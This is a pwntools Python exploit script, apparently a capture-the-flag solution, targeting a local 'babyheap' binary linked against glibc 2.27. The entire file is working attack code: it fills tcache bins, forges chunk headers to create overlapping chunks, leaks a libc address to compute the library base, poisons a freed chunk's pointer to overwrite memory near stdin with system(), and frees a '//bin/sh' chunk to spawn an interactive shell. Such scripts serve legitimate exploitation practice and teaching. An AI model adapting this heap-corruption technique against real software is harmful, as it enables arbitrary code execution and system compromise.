# libc2.27   md5: 50390b2ae8aaa73c47745040f54e602f

from pwn import *

libc = ELF('./libc.so.6')

def alloc(size):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(size))

def fill(idx, content):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(len(content)))
	r.sendafter(':', content)

def free(idx):
	r.sendlineafter(':', '3')
	r.sendlineafter(':', str(idx))

def dump(idx):
	r.sendlineafter(':', '4')
	r.sendlineafter(':', str(idx))

r = process('./babyheap')

for _ in range(7):
	alloc(0x80) # 0~6
for i in range(7):
	free(i) # 0~6
for _ in range(7):
	alloc(0x10) # 0~7
for i in range(7):
	free(i) # 0~7

alloc(0x10) # 0
alloc(0x10) # 1
alloc(0x10) # 2
alloc(0x10) # 3
alloc(0x80) # 4
alloc(0x10) # 5 avoid merge

free(2)
free(1)
fill(3, p64(0)*3 + p64(0x21))
fill(0, p64(0)*3 + p64(0x21) + '\xa0')
alloc(0x10) # 1
alloc(0x10) # 2  same as 4
fill(3, p64(0)*3 + p64(0x91))
free(4)
dump(2)

libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x60 - 0x3ebc40
system = libc_base + libc.symbols['system']
stdin = libc_base + libc.symbols['stdin']

alloc(0x80) # 4

for _ in range(7):
	alloc(0x60) # 6~12
for i in range(7):
	free(i+6)


alloc(0x60) # 6
alloc(0x60) # 7
free(7)


fill(6, p64(0)*13 + p64(0x71) + p64(stdin+0x5))
alloc(0x60) # 7
alloc(0x60) # 8
fill(8, '\x00'*0x1083 + p64(system))
alloc(0x10) # 9
fill(9, "//bin/sh")
free(9)


r.interactive()
